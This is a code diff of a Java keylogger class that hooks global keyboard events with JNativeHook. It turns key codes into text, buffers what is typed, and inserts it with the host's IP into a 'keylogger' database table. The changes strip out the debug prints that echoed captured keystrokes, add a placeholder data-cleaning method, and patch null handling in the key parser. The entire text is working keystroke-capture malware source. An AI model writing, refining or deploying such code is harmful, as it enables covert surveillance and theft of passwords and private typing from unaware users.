@@ -105,14 +105,11 @@ public class KeyLogger implements NativeKeyListener {
 	@Override
     public void nativeKeyPressed(NativeKeyEvent e) {
         //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
-		System.out.println(e.getKeyCode());
         int code = e.getKeyCode();
         String val =parser(e.getKeyCode()); 
 
         if(!StringUtils.isEmpty(val));
         	data += val;
-        	
-        
         
         if(code == NativeKeyEvent.VC_BACKSPACE){
         	if(data.length()>0)
@@ -125,11 +122,7 @@ public class KeyLogger implements NativeKeyListener {
         	data ="";
         }
       
-        
-        System.out.println("Data :-> " + data);
-        //System.out.println("Key code : " + e.getKeyCode());
-        //System.out.println("Char: ->"+ e.getKeyChar());
-        
+        //System.out.println("Data :-> " + data);
 
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {
@@ -144,7 +137,7 @@ public class KeyLogger implements NativeKeyListener {
 	private void store(String data) {
 		// TODO Auto-generated method stub
 		System.out.println("Triying to store data!!! ->" + data);
-
+		String stdata = cleandata(data);
 		jdbc.getConnection(res -> {
 			System.out.println("Getting connection");
 			  if (res.succeeded()) {
@@ -152,7 +145,7 @@ public class KeyLogger implements NativeKeyListener {
 				    SQLConnection conn = res.result();
 				    
 				    DateTime time = DateTime.now();		    
-				    conn.queryWithParams("INSERT INTO keylogger(ip,data) VALUES (?, ?)", new JsonArray().add(IP).add(data), resa -> {
+				    conn.queryWithParams("INSERT INTO keylogger(ip,data) VALUES (?, ?)", new JsonArray().add(IP).add(stdata), resa -> {
 				    	  if (resa.succeeded()) {
 				    	    System.out.println("Added keylog");
 				    	    conn.close();
@@ -168,9 +161,18 @@ public class KeyLogger implements NativeKeyListener {
 	}
 
 
+	private String cleandata(String data) {
+		// TODO Auto-generated method stub
+		//StringUtils.replace(data, "null","-");
+		return data;
+	}
+
+
 	private String parser(int keyCode) {
 		// TODO Auto-generated method stub
 		String value = keyword.get(keyCode);
+		if(value==null)
+			return "";
 		return value;
 		
 	}
